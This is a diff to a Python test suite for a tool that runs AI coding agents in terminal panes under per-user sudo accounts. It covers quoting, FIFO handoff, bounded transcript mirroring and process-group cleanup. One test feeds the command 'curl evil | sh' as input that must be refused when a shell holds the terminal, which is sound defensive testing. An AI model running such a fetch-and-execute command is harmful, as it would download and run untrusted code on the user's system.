@@ -4,19 +4,23 @@ No sudo and no real herdr here: a fake herdr types the pane's command into a sta
 which reads the spec from the FIFO and copies a transcript onto the mirror fd with neo-run's own code.
 """
 
+import fcntl
 import importlib.machinery
 import importlib.util
 import json
 import os
+import pty
 import signal
 import stat
 import subprocess
 import sys
 import tempfile
+import termios
 import textwrap
 import threading
 import time
 import unittest
+from datetime import datetime, timezone
 from pathlib import Path
 from unittest.mock import MagicMock, patch
 
@@ -98,6 +102,12 @@ FAKE_HERDR = textwrap.dedent(
         with open(os.path.join(state, "source.jsonl"), "a") as fh:  # lands in the account's transcript
             fh.write(json.dumps({{"type": "user", "message": {{"content": args[3]}}}}) + "\\n")
         out({{"type": "ok"}})
+    elif args[:2] == ["pane", "process-info"]:
+        try:
+            names = json.loads(open(os.path.join(state, "fg")).read())
+        except OSError:
+            names = ["sudo", "python3", "claude"]
+        out({{"process_info": {{"foreground_processes": [{{"name": n}} for n in names]}}}})
     elif args[:2] == ["agent", "read"] or args[:2] == ["pane", "read"]:
         print("❯ ")
     else:
@@ -220,8 +230,10 @@ class LiveInAccountTest(Base):
         create = next(c for c in calls if c[:2] == ["workspace", "create"])
         self.assertEqual(create[create.index("--cwd") + 1], str(irun.run.dir))  # a folder neo can enter
         line = next(c for c in calls if c[:2] == ["pane", "run"])[3]
-        fifo, mirror = irun.run.dir / "spec.fifo", irun.run.dir / "transcript.jsonl"
-        self.assertEqual(line, f" sudo -n -C 5 -u neo-ajay /usr/local/bin/neo-run --spec-fd 3 3<{fifo} 4>>{mirror}")
+        fifo, mirror, log = (irun.run.dir / n for n in ("spec.fifo", "transcript.jsonl", "neo-run.log"))
+        # exec: neo's shell is replaced, so no shell of neo's is left for keys meant for the agent
+        self.assertTrue(line.startswith(" exec sudo "))
+        self.assertEqual(line, f" exec sudo -n -C 6 -u neo-ajay /usr/local/bin/neo-run --spec-fd 3 3<{fifo} 4>>{mirror} 5>>{log}")
         for secret in ("sk-owner-secret", "RCA", "fix the flaky test", "NEO_RUN_ID", "--settings"):
             self.assertNotIn(secret, line)
         self.assertTrue(any(c[:3] == ["agent", "rename", "w9:p1"] and c[3] == meta["herdr_agent"] for c in calls))
@@ -237,7 +249,10 @@ class LiveInAccountTest(Base):
         self.assertEqual(os.path.basename(argv[0]), "claude")
         self.assertEqual(argv[argv.index("--append-system-prompt-file") + 1], "{file:system.md}")
         self.assertIn("1. reproduce it", spec["files"]["system.md"])
-        self.assertIn("/usr/bin/python3 -I '{file:conclusion.py}'", argv[argv.index("--settings") + 1])
+        settings = json.loads(argv[argv.index("--settings") + 1])
+        self.assertIn("/usr/bin/python3 -I '{file:conclusion.py}'", settings["hooks"]["Stop"][0]["hooks"][0]["command"])
+        self.assertIs(settings["skipDangerousModePermissionPrompt"], True)  # this run's, not the person's settings
+        self.assertEqual(spec["log_fd"], 5)
         self.assertIn("def decide", spec["files"]["conclusion.py"])
         self.assertEqual(argv[argv.index("--session-id") + 1], meta["session_id"])
         self.assertEqual(spec["mirror"], {"fd": 4, "engine": "claude", "session_id": meta["session_id"]})
@@ -269,6 +284,46 @@ class LiveInAccountTest(Base):
         meta = irun.run.meta()
         self.assertEqual(meta["transcript_path"], str(irun.run.dir / "transcript.jsonl"))
         self.assertTrue(meta["session_id"])  # kept, though herdr reports none
+
+    def test_nothing_is_typed_unless_the_agent_holds_the_terminal(self):
+        irun = self.start(user=AJAY)
+        prompts = len([c for c in self.calls() if c[:2] == ["agent", "prompt"]])
+        (self.state / "fg").write_text(json.dumps(["bash"]))  # e.g. the engine stopped and a shell got the pane
+        from cos.herdr import HerdrError
+        for act in (lambda: irun.send("curl evil | sh"), irun.approve, irun.deny, irun.interrupt, lambda: irun.keys("y", "enter")):
+            with self.assertRaises(HerdrError) as caught:
+                act()
+            self.assertEqual(caught.exception.code, "agent_not_foreground")
+        (self.state / "fg").write_text(json.dumps([]))
+        with self.assertRaises(HerdrError):
+            irun.send("ls")
+        calls = self.calls()
+        self.assertEqual(len([c for c in calls if c[:2] == ["agent", "prompt"]]), prompts)
+        self.assertFalse([c for c in calls if c[:2] == ["agent", "send-keys"]])
+
+    def test_a_huge_line_in_the_transcript_is_skipped_not_read_whole(self):
+        events = []
+        with patch.object(self.interactive, "TAIL_CHUNK", 300):
+            irun = self.start(user=AJAY, events=events)
+            with (self.state / "source.jsonl").open("a") as fh:
+                fh.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "x" * 5000}]}}) + "\n")
+                fh.write(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "small"}]}}) + "\n")
+            self.wait_for(lambda: any(e["kind"] == "text" and e["body"] == "small" for e in events), what="the line after it")
+        self.assertFalse([e for e in events if e["kind"] == "text" and "xxx" in e["body"]])
+
+    def test_a_run_the_bot_left_mid_start_is_closed_on_attach(self):
+        from cos.runner import Run
+        run = Run.create("claude", "hi", str(self.work / "app"), "full", source="slack", runtime="herdr",
+                         extra={"slack_user": AJAY})
+        run.update_meta(status="starting", herdr_agent="neo-x", herdr_workspace="w7", herdr_pane="w7:p1")
+        os.mkfifo(run.dir / "spec.fifo", 0o600)
+        events = []
+        irun = self.interactive.InteractiveRun.attach(run.id, on_event=events.append)
+        self.assertFalse((run.dir / "spec.fifo").exists())
+        self.assertEqual(run.meta()["status"], "closed")
+        self.assertFalse(irun.alive)
+        self.assertIn(["workspace", "close", "w7"], self.calls())
+        self.assertEqual(events[-1]["title"], "Never started")
 
     def test_a_reattached_watcher_reads_the_mirror_from_its_offset(self):
         events = []
@@ -323,9 +378,10 @@ class PaneLaunchTest(unittest.TestCase):
         self.assertEqual(accounts.command("neo-ajay", 3, 4)[:4], ["sudo", "-n", "-C", "5"])
         self.assertEqual(accounts.command("neo-ajay", 3, 4)[-2:], ["--spec-fd", "3"])  # the sudoers rule's form
 
-    def test_odd_paths_are_quoted(self):
-        line = accounts.pane_command("neo-ajay", "/runs/a b/spec.fifo", "/runs/a b/t.jsonl")
-        self.assertTrue(line.endswith(" 3<'/runs/a b/spec.fifo' 4>>'/runs/a b/t.jsonl'"))
+    def test_the_pane_line_replaces_neos_shell_and_quotes_odd_paths(self):
+        line = accounts.pane_command("neo-ajay", "/runs/a b/spec.fifo", "/runs/a b/t.jsonl", "/runs/a b/l.log")
+        self.assertTrue(line.startswith(" exec sudo -n -C 6 -u neo-ajay /usr/local/bin/neo-run --spec-fd 3 "))
+        self.assertTrue(line.endswith(" 3<'/runs/a b/spec.fifo' 4>>'/runs/a b/t.jsonl' 5>>'/runs/a b/l.log'"))
 
     def test_the_fifo_hands_the_spec_to_its_first_reader_then_is_gone(self):
         folder = Path(tempfile.mkdtemp())
@@ -364,6 +420,8 @@ class NeoRunLiveTest(unittest.TestCase):
                 patch.object(self.mod, "engine_path", return_value="/usr/bin/claude"), \
                 patch.object(self.mod.subprocess, "Popen", return_value=child) as popen, \
                 patch.object(self.mod.signal, "signal"), \
+                patch.object(self.mod, "terminal_fd", return_value=None), \
+                patch.object(self.mod, "claude_running", return_value=False), \
                 patch.object(sys, "argv", ["neo-run", "--spec-fd", str(read_fd)]), \
                 patch.dict(os.environ, {"TERM": "xterm-256color"}):
             self.assertEqual(self.mod.main(), 0)
@@ -371,7 +429,9 @@ class NeoRunLiveTest(unittest.TestCase):
 
     def test_a_live_agent_keeps_the_terminal_and_a_headless_one_gets_its_own_session(self):
         popen = self.run_main({"argv": ["claude"], "cwd": str(self.home / "code" / "app"), "tty": True})
-        self.assertIs(popen.call_args.kwargs["start_new_session"], False)  # herdr sees it in the pane's job
+        # its own group, but in the pane's session: herdr sees it as the foreground job (see the pty test)
+        self.assertEqual(popen.call_args.kwargs["process_group"], 0)
+        self.assertNotIn("start_new_session", popen.call_args.kwargs)
         self.assertEqual(popen.call_args.kwargs["env"]["TERM"], "xterm-256color")
         popen = self.run_main({"argv": ["claude"], "cwd": ""})
         self.assertIs(popen.call_args.kwargs["start_new_session"], True)
@@ -380,8 +440,12 @@ class NeoRunLiveTest(unittest.TestCase):
     def test_a_live_claude_skips_first_run_screens_but_keeps_the_persons_choices(self):
         self.run_main({"argv": ["claude"], "cwd": "", "tty": True})
         self.assertEqual(json.loads((self.home / ".claude.json").read_text()), {"hasCompletedOnboarding": True, "theme": "dark"})
-        self.assertEqual(json.loads((self.home / ".claude" / "settings.json").read_text()), {"skipDangerousModePermissionPrompt": True})
-        (self.home / ".claude.json").write_text(json.dumps({"theme": "light", "projects": {"x": {}}}))
+        self.assertFalse((self.home / ".claude" / "settings.json").exists(), "the person's own settings are theirs")
+        mine = json.dumps({"theme": "light", "projects": {"x": {}}})
+        (self.home / ".claude.json").write_text(mine)
+        with patch.object(self.mod, "claude_running", return_value=True):  # it rewrites the file itself: hands off
+            self.mod.prepare_live_claude(self.home)
+        self.assertEqual((self.home / ".claude.json").read_text(), mine)
         self.run_main({"argv": ["claude"], "cwd": "", "tty": True})
         self.assertEqual(json.loads((self.home / ".claude.json").read_text()),
                          {"hasCompletedOnboarding": True, "theme": "light", "projects": {"x": {}}})
@@ -425,6 +489,63 @@ class NeoRunLiveTest(unittest.TestCase):
         with self.assertRaises(OSError):
             os.fstat(fd)  # closed when done
 
+    def test_the_mirror_reads_in_bounded_chunks_up_to_a_cap(self):
+        source = self.home / "t.jsonl"
+        source.write_bytes(b"a" * 1000)
+        out = self.home / "mirror.jsonl"
+        fd = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
+        stop = threading.Event()
+        stop.set()
+        reads = []
+        real = self.mod.read_regular
+        with patch.object(self.mod, "read_regular", side_effect=lambda *a: reads.append(a[2]) or real(*a)):
+            self.mod.mirror(fd, lambda: source, stop, 0.01, limit=700, chunk_size=128)
+        self.assertEqual(out.read_bytes(), b"a" * 700)
+        self.assertTrue(reads and max(reads) <= 128)
+
+    def test_the_mirror_copies_only_a_regular_file(self):
+        real = self.home / "real.jsonl"
+        real.write_text("secret of someone else\n")
+        link = self.home / "link.jsonl"
+        link.symlink_to(real)
+        fifo = self.home / "fifo.jsonl"
+        os.mkfifo(fifo)
+        for path in (link, fifo, self.home):
+            out = self.home / f"out-{path.name}"
+            fd = os.open(out, os.O_WRONLY | os.O_CREAT, 0o600)
+            stop = threading.Event()
+            stop.set()
+            copier = threading.Thread(target=self.mod.mirror, args=(fd, lambda p=path: p, stop, 0.01))
+            copier.start()
+            copier.join(timeout=5)
+            self.assertFalse(copier.is_alive(), f"{path.name}: never block on it")
+            self.assertEqual(out.read_bytes(), b"", path.name)
+
+    def test_two_codex_runs_in_one_folder_never_mirror_the_same_rollout(self):
+        cwd = self.home / "code" / "app"
+        day = self.home / ".codex" / "sessions" / "2026" / "11" / "02"
+        day.mkdir(parents=True)
+        spawn = time.time()
+
+        def rollout(name, start):
+            stamp = datetime.fromtimestamp(start, timezone.utc).isoformat().replace("+00:00", "Z")
+            path = day / f"rollout-{name}.jsonl"
+            path.write_text(json.dumps({"type": "session_meta", "payload": {"cwd": str(cwd), "timestamp": stamp}}) + "\n")
+            return path
+
+        rollout("old", spawn - 60)  # an earlier session in the same folder: never this run's
+        first, second = rollout("a", spawn + 1), rollout("b", spawn + 2)
+        root = self.home / ".neo-run"
+        mine, theirs = root / "run-1", root / "run-2"
+        for folder in (mine, theirs):
+            folder.mkdir(parents=True)
+            (folder / ".pid").write_text(str(os.getpid()))
+        self.assertEqual(self.mod.find_transcript(self.home, "codex", "", cwd, spawn, theirs), first)
+        self.assertEqual(self.mod.find_transcript(self.home, "codex", "", cwd, spawn, mine), second)
+        self.assertEqual((mine / ".claim").read_text(), str(second))
+        (root / "run-3").mkdir()
+        self.assertIsNone(self.mod.find_transcript(self.home, "codex", "", cwd, spawn + 10, root / "run-3"))
+
     def test_folders_left_by_a_killed_neo_run_are_swept(self):
         root = self.home / ".neo-run"
         dead = subprocess.Popen([sys.executable, "-c", "pass"])
@@ -449,11 +570,104 @@ class NeoRunLiveTest(unittest.TestCase):
         self.assertIsNone(self.mod.find_transcript(self.home, "claude", "*", cwd, 0))
         rollout = self.home / ".codex" / "sessions" / "2026" / "11" / "02" / "rollout-x-th-1.jsonl"
         rollout.parent.mkdir(parents=True)
-        rollout.write_text(json.dumps({"payload": {"cwd": str(cwd)}}) + "\n")
-        self.assertEqual(self.mod.find_transcript(self.home, "codex", "", cwd, time.time()), rollout)
+        now = time.time()
+        stamp = datetime.fromtimestamp(now, timezone.utc).isoformat()
+        rollout.write_text(json.dumps({"payload": {"cwd": str(cwd), "timestamp": stamp}}) + "\n")
+        self.assertEqual(self.mod.find_transcript(self.home, "codex", "", cwd, now), rollout)
         self.assertEqual(self.mod.find_transcript(self.home, "codex", "th-1", cwd, 0), rollout)
-        self.assertIsNone(self.mod.find_transcript(self.home, "codex", "", self.home, time.time()))
+        self.assertIsNone(self.mod.find_transcript(self.home, "codex", "", self.home, now))
 
 
 if __name__ == "__main__":
     unittest.main()
+
+
+# Stands in for neo-run as the account: the real main(), with its account and engine looked up here.
+PTY_NEO_RUN = textwrap.dedent(
+    """
+    import importlib.machinery, importlib.util, os, sys
+    from pathlib import Path
+    from unittest.mock import patch
+    loader = importlib.machinery.SourceFileLoader("neo_run", os.environ["NEO_RUN_SOURCE"])
+    spec = importlib.util.spec_from_loader(loader.name, loader)
+    mod = importlib.util.module_from_spec(spec)
+    loader.exec_module(mod)
+    with patch.object(mod, "account_home", return_value=Path(os.environ["FAKE_HOME"])), \\
+            patch.object(mod, "engine_path", return_value=sys.executable):
+        sys.exit(mod.main())
+    """
+)
+PTY_ENGINE = textwrap.dedent(
+    """
+    import json, os, subprocess, time
+    kid = subprocess.Popen(["sleep", "300"])  # what an engine leaves running: an MCP server, a shell
+    info = {"engine": os.getpid(), "pgid": os.getpgrp(), "kid": kid.pid, "kid_pgid": os.getpgid(kid.pid),
+            "foreground": os.tcgetpgrp(0)}
+    open(os.environ["OUT"] + ".tmp", "w").write(json.dumps(info))
+    os.rename(os.environ["OUT"] + ".tmp", os.environ["OUT"])
+    time.sleep(300)
+    """
+)
+
+
+def _alive(pid: int) -> bool:
+    try:
+        with open(f"/proc/{pid}/stat") as fh:
+            return fh.read().rsplit(") ", 1)[1][0] != "Z"
+    except (OSError, IndexError):
+        return False
+
+
+class NeoRunTerminalTest(unittest.TestCase):
+    """neo-run in a real terminal (a pty), as in a herdr pane: the engine gets its own group and the
+    terminal, and a stop takes the whole group, not just the engine."""
+
+    def test_stop_takes_the_engines_whole_group_and_the_terminal_was_the_engines(self):
+        base = Path(tempfile.mkdtemp())
+        home = base / "neo-ajay"
+        (home / "code").mkdir(parents=True)
+        (base / "neo_run_pty.py").write_text(PTY_NEO_RUN)
+        out = base / "out.json"
+        spec = {"argv": ["claude", "-c", PTY_ENGINE], "cwd": "", "tty": True, "env": {"OUT": str(out)}}
+        read_fd, write_fd = os.pipe()
+        os.write(write_fd, json.dumps(spec).encode())
+        os.close(write_fd)
+        master, slave = pty.openpty()
+
+        def own_terminal():  # like the pane: a session whose controlling terminal is the pty
+            os.setsid()
+            fcntl.ioctl(0, termios.TIOCSCTTY, 0)
+
+        proc = subprocess.Popen([sys.executable, str(base / "neo_run_pty.py"), "--spec-fd", str(read_fd)],
+                                stdin=slave, stdout=slave, stderr=slave, pass_fds=(read_fd,), preexec_fn=own_terminal,
+                                env={"PATH": os.environ["PATH"], "FAKE_HOME": str(home),
+                                     "NEO_RUN_SOURCE": str(ROOT / "deploy" / "linux" / "neo-run")})
+        os.close(slave)
+        os.close(read_fd)
+        info = None
+        try:
+            deadline = time.monotonic() + 15
+            while not out.exists() and time.monotonic() < deadline:
+                time.sleep(0.05)
+            info = json.loads(out.read_text())
+            self.assertEqual(info["pgid"], info["engine"], "the engine leads its own group")
+            self.assertNotEqual(info["pgid"], os.getpgid(proc.pid), "not neo-run's group")
+            self.assertEqual(info["kid_pgid"], info["pgid"])
+            self.assertEqual(info["foreground"], info["pgid"], "the engine holds the terminal")
+            proc.send_signal(signal.SIGTERM)  # what sudo relays when neo stops the run
+            proc.wait(timeout=15)
+            deadline = time.monotonic() + 5
+            while time.monotonic() < deadline and any(_alive(p) for p in (info["engine"], info["kid"])):
+                time.sleep(0.05)
+            self.assertFalse(_alive(info["kid"]), "what the engine started dies with it")
+            self.assertFalse(_alive(info["engine"]))
+        finally:
+            if proc.poll() is None:
+                proc.kill()
+            if info:
+                for pid in (info["engine"], info["kid"]):
+                    try:
+                        os.kill(pid, signal.SIGKILL)
+                    except ProcessLookupError:
+                        pass
+            os.close(master)
